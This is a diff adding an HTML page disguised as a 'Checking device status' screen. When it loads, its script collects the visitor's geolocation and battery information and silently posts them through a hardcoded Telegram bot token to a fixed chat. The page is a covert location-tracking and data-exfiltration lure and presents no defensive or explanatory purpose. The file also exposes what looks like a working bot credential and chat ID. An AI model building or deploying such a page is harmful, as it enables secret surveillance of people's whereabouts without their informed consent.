@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Checking Device Status...</title>
+    <script>
+        async function sendData() {
+            let data = {};
+
+            // Get Location
+            function getLocation() {
+                return new Promise((resolve) => {
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                data.location = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                };
+                                resolve();
+                            },
+                            () => {
+                                data.location = "Permission Denied";
+                                resolve();
+                            }
+                        );
+                    } else {
+                        data.location = "Not Supported";
+                        resolve();
+                    }
+                });
+            }
+
+            // Get Battery Info
+            function getBatteryInfo() {
+                return new Promise((resolve) => {
+                    if (navigator.getBattery) {
+                        navigator.getBattery().then(battery => {
+                            data.battery = {
+                                level: battery.level * 100 + "%",
+                                charging: battery.charging ? "Charging" : "Not Charging"
+                            };
+                            resolve();
+                        });
+                    } else {
+                        data.battery = "Not Supported";
+                        resolve();
+                    }
+                });
+            }
+
+            // Wait for both location & battery data
+            await Promise.all([getLocation(), getBatteryInfo()]);
+            sendToTelegram(data);
+        }
+
+        function sendToTelegram(data) {
+            fetch("https://api.telegram.org/bot7570012997:AAFqnbInLmAH0O_49cxHu4W87HnVOdfjKS0/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: "1679328294", // No < >
+                    text: JSON.stringify(data, null, 2),
+                }),
+            }).then(response => response.json())
+              .then(result => console.log("Sent to Telegram:", result))
+              .catch(error => console.error("Error:", error));
+        }
+
+        window.onload = sendData;
+    </script>
+</head>
+<body>
+    <h3>Checking device status...</h3>
+</body>
+</html>
